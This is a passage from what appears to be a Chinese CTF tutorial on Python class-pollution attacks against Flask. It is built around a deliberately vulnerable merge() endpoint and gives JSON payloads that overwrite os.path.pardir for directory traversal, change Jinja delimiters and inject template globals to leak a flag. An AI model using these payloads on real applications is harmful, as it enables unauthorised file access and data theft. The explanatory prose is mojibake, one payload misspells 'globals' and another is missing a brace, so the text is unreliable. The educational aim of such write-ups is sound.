</span></span><span class="line"><span class="cl">            <span class="ow">or</span> <span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">altsep</span> <span class="ow">and</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">altsep</span> <span class="ow">in</span> <span class="n">piece</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="ow">or</span> <span class="n">piece</span> <span class="o">==</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">pardir</span><span class="c1">#34è¡Œ</span>
</span></span><span class="line"><span class="cl">        <span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="k">raise</span> <span class="n">TemplateNotFound</span><span class="p">(</span><span class="n">template</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="n">piece</span> <span class="ow">and</span> <span class="n">piece</span> <span class="o">!=</span> <span class="s2">&#34;.&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">pieces</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">piece</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">pieces</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç»“åˆå‡½æ•°æ³¨é‡Šå¯ä»¥äº†è§£åˆ°è¿™ä¸ªå‡½æ•°å°†ä¼šæŠŠä¼ å…¥çš„æ¨¡æ¿è·¯å¾„æŒ‰ç…§<code>/</code>è¿›è¡Œåˆ†å‰²ï¼Œåœ¨34è¡Œçš„é€»è¾‘åˆ¤æ–­ä¸Šå†³å®šäº†ï¼ˆå…¶ä½™çš„éƒ¨åˆ†é€»è¾‘å€¼åŸºæœ¬ä¸ºå‡ï¼‰æ•´ä¸ª<code>if</code>è¯­å¥æ˜¯å¦ä¸ºçœŸï¼Œæ˜¾ç„¶éœ€è¦æ”¹è¯­å¥ä¸ºå‡é¿å…è§¦å‘36è¡Œçš„<code>raise</code>ã€‚34è¡Œä¸­çš„<code>os.path.pardir</code>å€¼å³ä¸º<code>..</code>ï¼Œæ‰€ä»¥åªè¦ä¿®æ”¹è¯¥å±æ€§ä¸ºä»»æ„å…¶ä»–å€¼å³å¯é¿å…æŠ¥é”™ï¼Œä»è€Œå®ç°<code>render_template</code>å‡½æ•°çš„ç›®å½•ç©¿è¶Š</p>
<p>è¿™é‡Œæ”¹æˆ<code>,</code></p>
<p>payload</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">payload</span><span class="o">=</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;__init__&#34;</span><span class="p">:{</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;__globals__&#34;</span><span class="p">:{</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;os&#34;</span><span class="p">:{</span>
</span></span><span class="line"><span class="cl">                <span class="s2">&#34;path&#34;</span><span class="p">:{</span>
</span></span><span class="line"><span class="cl">                    <span class="s2">&#34;pardir&#34;</span><span class="p">:</span><span class="s2">&#34;,&#34;</span>
</span></span><span class="line"><span class="cl">                <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç„¶åå°±å¯ä»¥ç›®å½•ç©¿è¶Šäº†</p>
<h2 id="jinjaè¯­æ³•æ ‡è¯†ç¬¦">Jinjaè¯­æ³•æ ‡è¯†ç¬¦
</h2><p>åœ¨é»˜è®¤çš„è§„åˆ™è§„åˆ™ä¸‹ï¼Œå¸¸ç”¨<code>Jinja</code>è¯­æ³•æ ‡è¯†ç¬¦æœ‰<code>{{ Code }}</code>ã€<code>{% Code %}</code>ã€<code>{# Code #}</code>ï¼Œå½“ç„¶å¯¹äºæˆ‘ä»¬éœ€è¦<code>RCE</code>çš„éœ€æ±‚æ¥è¯´ï¼Œé€šå¸¸å‰ä¸¤è€…æ‰éœ€è¦ç•™æ„ã€‚è€Œ<code>Flask</code>å®˜æ–¹æ–‡æ¡£ä¸­æ˜ç¡®å‘ŠçŸ¥äº†ï¼Œè¿™äº›è¯­æ³•æ ‡è¯†ç¬¦å‡æ˜¯å¯ä»¥ä¾ç…§<code>Jinja</code>ä¸­ä¿®æ”¹çš„</p>
<p>åœ¨<code>Jinja</code>æ–‡æ¡£ä¸­å±•ç¤ºäº†å¯¹è¿™äº›è¯­æ³•æ ‡è¯†ç¬¦è¿›è¡Œæ›¿æ¢çš„æ–¹æ³•ï¼š<a class="link" href="https://jinja.palletsprojects.com/en/3.1.x/api/#jinja2.Environment"  target="_blank" rel="noopener"
    >API â€” Jinja Documentation (3.1.x) (palletsprojects.com)</a>ï¼Œå³å¯¹<code>Jinja</code>çš„ç¯å¢ƒç±»çš„ç›¸å…³å±æ€§èµ‹å€¼ï¼Œæ–‡æ¡£ä¸­æåˆ°è¯´ï¼Œå¦‚æœæ­¤ç±»çš„å®ä¾‹æœªå…±äº«å¹¶ä¸”å°šæœªåŠ è½½æ¨¡æ¿çš„è¯ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä¿®æ”¹æ­¤ç±»çš„å®ä¾‹</p>
<p>è€Œåœ¨<code>Flask</code>ä¸­ä½¿ç”¨äº†<code>Flask</code>ç±»ï¼ˆ<code>Lib/site-packages/flask/app.py</code>ï¼‰çš„è£…é¥°å™¨è£…é¥°åçš„<code>jinja_env</code>æ–¹æ³•å®ç°ä¸Šè¿°çš„åŠŸèƒ½ï¼›ç»è¿‡è£…é¥°å™¨çš„è£…é¥°åï¼Œç®€å•æ¥è¯´å¯ä»¥å°†è¯¥æ–¹æ³•è§†ä¸ºå±æ€§ï¼Œå¯¹è¯¥æ–¹æ³•çš„è·å–å°±èƒ½å®ç°æ–¹æ³•è°ƒç”¨ï¼Œç±»ä¼¼<code>Flask.jinja_env</code>å°±ç›¸å½“äº<code>Flask.jinja_env()</code>ã€‚</p>
<p>è·Ÿè¿›å…¶ä¸­è°ƒç”¨çš„<code>create_jinja_environment</code>ï¼Œç»“åˆæ³¨é‡Šå°±å¯ä»¥å‘ç°<code>jinja_env</code>æ–¹æ³•è¿”å›å€¼å°±æ˜¯<code>Jinja</code>ä¸­çš„ç¯å¢ƒç±»ï¼ˆå®é™…ä¸Šæ˜¯å¯¹åŸç”Ÿçš„<code>Jinja</code>ç¯å¢ƒç±»åšäº†ç»§æ‰¿ï¼Œä¸è¿‡åœ¨ä½¿ç”¨ä¸Šå¹¶æ— å¤šå¤§åŒºåˆ«ï¼‰ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç›´æ¥é‡‡ç”¨ç±»ä¼¼<code>Flask.jinja_env.variable_start_string = &quot;xxx&quot;</code>æ¥å®ç°å¯¹<code>Jinja</code>è¯­æ³•æ ‡è¯†ç¬¦è¿›è¡Œæ›¿æ¢</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl">#templates/index.html
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>Look this -&gt; [[flag]] <span class="p">&lt;</span><span class="nt">-</span> <span class="na">try</span> <span class="na">to</span> <span class="na">make</span> <span class="na">it</span> <span class="na">become</span> <span class="na">the</span> <span class="na">real</span> <span class="na">flag</span><span class="err">&lt;/</span><span class="na">h1</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>    
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1">#app.py</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span><span class="n">request</span><span class="p">,</span><span class="n">render_template</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">json</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">merge</span><span class="p">(</span><span class="n">src</span><span class="p">,</span> <span class="n">dst</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># Recursive merge function</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">src</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">hasattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="s1">&#39;__getitem__&#39;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">dst</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">k</span><span class="p">)</span> <span class="ow">and</span> <span class="nb">type</span><span class="p">(</span><span class="n">v</span><span class="p">)</span> <span class="o">==</span> <span class="nb">dict</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">merge</span><span class="p">(</span><span class="n">v</span><span class="p">,</span> <span class="n">dst</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">k</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">dst</span><span class="p">[</span><span class="n">k</span><span class="p">]</span> <span class="o">=</span> <span class="n">v</span>
</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="nb">hasattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">)</span> <span class="ow">and</span> <span class="nb">type</span><span class="p">(</span><span class="n">v</span><span class="p">)</span> <span class="o">==</span> <span class="nb">dict</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">merge</span><span class="p">(</span><span class="n">v</span><span class="p">,</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">setattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">cls</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">pass</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">instance</span> <span class="o">=</span> <span class="bp">cls</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span><span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">,</span> <span class="s1">&#39;GET&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">data</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">merge</span><span class="p">(</span><span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">data</span><span class="p">),</span> <span class="n">instance</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s2">&#34;go check /index before merge it&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/index&#39;</span><span class="p">,</span><span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">,</span> <span class="s1">&#39;GET&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">templates</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s2">&#34;test.html&#34;</span><span class="p">,</span> <span class="n">flag</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;flag&#34;</span><span class="p">,</span> <span class="s2">&#34;rt&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s2">&#34;0.0.0.0&#34;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è®¿é—®<code>index</code>è·¯ç”±ä¼šç»™æ¨¡æ¿å¡«å……<code>flag</code>å˜é‡çš„å€¼ï¼Œä½†æ˜¯éœ€è¦åº”è¯¥è¦è¯­æ³•æ ‡è¯†ç¬¦æ˜¯<code>{{flag}}</code>ï¼Œä½†è¿™é‡Œæ˜¯<code>[[flag]]</code>æ˜¯æ— æ³•è¢«è§£æçš„</p>
<p>æˆ‘ä»¬æƒ³è¦é€šè¿‡{{flag}}çš„è¯ï¼Œå°±éœ€è¦å°†è¯­æ³•æ ‡è¯†ç¬¦è¿›è¡Œæ›¿æ¢ï¼Œè¿™é‡Œæˆ‘ä»¬å°±å°†è¯­æ³•æ ‡è¯†ç¬¦ä»{{}}ï¼Œæ›¿æ¢ä¸º[[]]è¿™æ ·çš„è¯ï¼Œ[[flag]]å°±èƒ½å¤Ÿåƒ{{flag}}ä¸€æ ·è¢«è§£æäº†ã€‚</p>
<p>payload</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;__init__&#34;</span> <span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;__globals__&#34;</span> <span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="s2">&#34;app&#34;</span> <span class="p">:</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="s2">&#34;jinja_env&#34;</span> <span class="p">:{</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;variable_start_string&#34;</span> <span class="p">:</span> <span class="s2">&#34;[[&#34;</span><span class="p">,</span><span class="s2">&#34;variable_end_string&#34;</span><span class="p">:</span><span class="s2">&#34;]]&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>        
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ä½†æ˜¯åœ¨Flaskæ¡†æ¶å½“ä¸­ï¼Œå®ƒä¼šå¯¹æ¨¡æ¿æ–‡ä»¶ç¼–è¯‘åè¿›è¡Œä¸€å®šçš„ç¼“å­˜ï¼Œä¸‹æ¬¡å†éœ€è¦æ¸²æŸ“çš„æ—¶å€™ï¼Œç›´æ¥ä½¿ç”¨ç¼“å­˜é‡Œé¢çš„æ¨¡æ¿æ–‡ä»¶ï¼Œè¿™æ ·çš„è¯æˆ‘ä»¬ä¿®æ”¹åè¯­æ³•æ ‡è¯†ç¬¦é‡Œé¢çš„flagå˜é‡å¹¶æ²¡æœ‰è¢«æ”¾åˆ°ç¼“å­˜å½“ä¸­ï¼Œæ‰€ä»¥æ²¡æœ‰è‡ªåŠ¨å¡«å……flagï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦åœ¨Flaskå¯åŠ¨ä»¥åå…ˆè¾“å…¥payloadå†è®¿é—®è·¯ç”±ï¼Œè¿™æ ·å°±å¯ä»¥åšåˆ°å…ˆæ±¡æŸ“å†è®¿é—®æ¨¡æ¿</p>
<p>æ‰€ä»¥åªéœ€æˆ‘ä»¬åœ¨<code>Flask</code>æœåŠ¡å¯åŠ¨åï¼ˆå½“ç„¶è¿™é‡Œæ¼”ç¤ºå°±æ˜¯é‡å¯ä¸‹<code>Flask</code>æœåŠ¡å°±è¡Œäº†ï¼Œå¯¹äºé¢˜ç›®æ¥è¯´ä¸€èˆ¬å°±æ˜¯é‡å¯å®¹å™¨ï¼Œæˆ–æ˜¯åœ¨æ±¡æŸ“ä¹‹åå†è®¿é—®æ¨¡æ¿ï¼‰å…ˆè¾“å…¥<code>payload</code>å†è®¿é—®<code>index</code>è·¯ç”±å³å¯</p>
<h2 id="jinjaè¯­æ³•å…¨å±€æ•°æ®">jinjaè¯­æ³•å…¨å±€æ•°æ®
</h2><p>å®é™…ä¸ŠåŒ…æ‹¬å‡½æ•°ã€å˜é‡ã€è¿‡æ»¤å™¨è¿™ä¸‰è€…éƒ½èƒ½è¢«è‡ªå®šä¹‰çš„æ·»åŠ åˆ°<code>Jinja</code>è¯­æ³•è§£ææ—¶çš„ç¯å¢ƒï¼Œæ“ä½œæ–¹å¼äº<code>Jinja</code>è¯­æ³•æ ‡è¯†ç¬¦ä¸­å®Œå…¨ç±»ä¼¼</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl">#templates/index.html
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>{{flag if permission else &#34;No way!&#34;}}<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>    
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1">#app.py</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span><span class="n">request</span><span class="p">,</span><span class="n">render_template</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">json</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">merge</span><span class="p">(</span><span class="n">src</span><span class="p">,</span> <span class="n">dst</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># Recursive merge function</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span> <span class="ow">in</span> <span class="n">src</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">hasattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="s1">&#39;__getitem__&#39;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">dst</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">k</span><span class="p">)</span> <span class="ow">and</span> <span class="nb">type</span><span class="p">(</span><span class="n">v</span><span class="p">)</span> <span class="o">==</span> <span class="nb">dict</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">merge</span><span class="p">(</span><span class="n">v</span><span class="p">,</span> <span class="n">dst</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">k</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">dst</span><span class="p">[</span><span class="n">k</span><span class="p">]</span> <span class="o">=</span> <span class="n">v</span>
</span></span><span class="line"><span class="cl">        <span class="k">elif</span> <span class="nb">hasattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">)</span> <span class="ow">and</span> <span class="nb">type</span><span class="p">(</span><span class="n">v</span><span class="p">)</span> <span class="o">==</span> <span class="nb">dict</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">merge</span><span class="p">(</span><span class="n">v</span><span class="p">,</span> <span class="nb">getattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="nb">setattr</span><span class="p">(</span><span class="n">dst</span><span class="p">,</span> <span class="n">k</span><span class="p">,</span> <span class="n">v</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">cls</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">pass</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">instance</span> <span class="o">=</span> <span class="bp">cls</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span><span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">,</span> <span class="s1">&#39;GET&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">data</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">merge</span><span class="p">(</span><span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">data</span><span class="p">),</span> <span class="n">instance</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s2">&#34;index.html&#34;</span><span class="p">,</span> <span class="n">flag</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;flag&#34;</span><span class="p">,</span> <span class="s2">&#34;rt&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s2">&#34;0.0.0.0&#34;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç›´æ¥è®¿é—®ä¼šç”±äºæ²¡æœ‰è®¾å®š<code>permission</code>å€¼å¯¼è‡´<code>if</code>æ¡ä»¶ä¸ºå‡è¿”å›<code>No way!</code>è€Œä¸æ˜¯<code>flag</code></p>
<p>æ‰€ä»¥å°†å…¶èµ‹å€¼ä¸ºä»»æ„é€»è¾‘éç©ºå€¼è®©æ¡ä»¶ä¸ºçœŸå³å¯</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{
</span></span><span class="line"><span class="cl">    &#34;__init__&#34; : {
</span></span><span class="line"><span class="cl">        &#34;__globals__&#34; : {
</span></span><span class="line"><span class="cl">            &#34;app&#34; : {
</span></span><span class="line"><span class="cl">                    &#34;jinja_env&#34; :{
</span></span><span class="line"><span class="cl">                      &#34;golbals&#34; :{
</span></span><span class="line"><span class="cl">                        &#34;permission&#34; :true
</span></span><span class="line"><span class="cl">                      }
</span></span><span class="line"><span class="cl">                }      
</span></span><span class="line"><span class="cl">            }
</span></span><span class="line"><span class="cl">        }
</span></span><span class="line"><span class="cl">    }
</span></span><span class="line"><span class="cl">}    
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="æ¨¡æ¿ç¼–è¯‘æ—¶çš„å˜é‡">æ¨¡æ¿ç¼–è¯‘æ—¶çš„å˜é‡
